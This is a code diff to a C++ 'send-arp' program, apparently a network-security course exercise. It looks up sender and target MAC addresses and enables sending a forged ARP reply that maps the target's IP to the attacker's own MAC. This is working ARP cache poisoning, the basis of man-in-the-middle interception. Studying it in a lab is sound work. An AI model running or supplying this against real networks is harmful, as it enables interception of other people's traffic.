@@ -1,6 +1,3 @@
-#include <cstdio>
-#include <pcap.h>
-#include <iostream>
 #include "send-arp.h"
 
 void usage(char* argv[]) {
@@ -23,27 +20,33 @@ int main(int argc, char* argv[]) {
 	}
 
 	Mac myMac = GetMyMac(std::string(dev));
-	std::cout << "[1] My Mac Address : " << std::string(myMac) << "\n";
-
 	Ip myip = GetMyIp(std::string(dev));
-	std::cout << "[1] My ip Address : " << std::string(myip) << "\n";
-
 	Mac sender_mac = GetMacfromIp(handle, Ip(argv[2]), myMac, myip);
-	std::cout << "[1] Sender Mac Address : " << std::string(sender_mac) << "\n";
-	
+	Mac target_mac = GetMacfromIp(handle, Ip(argv[3]), myMac, myip);
+
+	std::cout << "[1] My ip Address :      " << std::string(myip) << "\n";
+	std::cout << "[1] My Mac Address :     " << std::string(myMac) << "\n";
+	std::cout << "[1] sender ip :          " << argv[2] << "\n";
+	std::cout << "[1] sender Mac Address : " << std::string(sender_mac) << "\n";
+	std::cout << "[1] target ip :          " << argv[3] << "\n";
+	std::cout << "[1] target Mac Address : " << std::string(target_mac) << "\n";
 	
 
-/*
+
 	EthArpPacket packet;
-
-	MakeAttackPacket(&packet, argv[2], argv[3], myMac);
+	// eth : myMac -> sender_mac
+	// arp mac : myMac -> sender_mac
+	// arp ip : target -> sender_mac
+	MakeEthPacket(&packet, false, std::string(myMac).c_str(), std::string(sender_mac).c_str()
+					, std::string(myMac).c_str(), std::string(sender_mac).c_str(), argv[3], argv[2]);
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
+	
+	std::cout << "[1] DONE!" << "\n";
 
 	pcap_close(handle);
-*/
 
 }
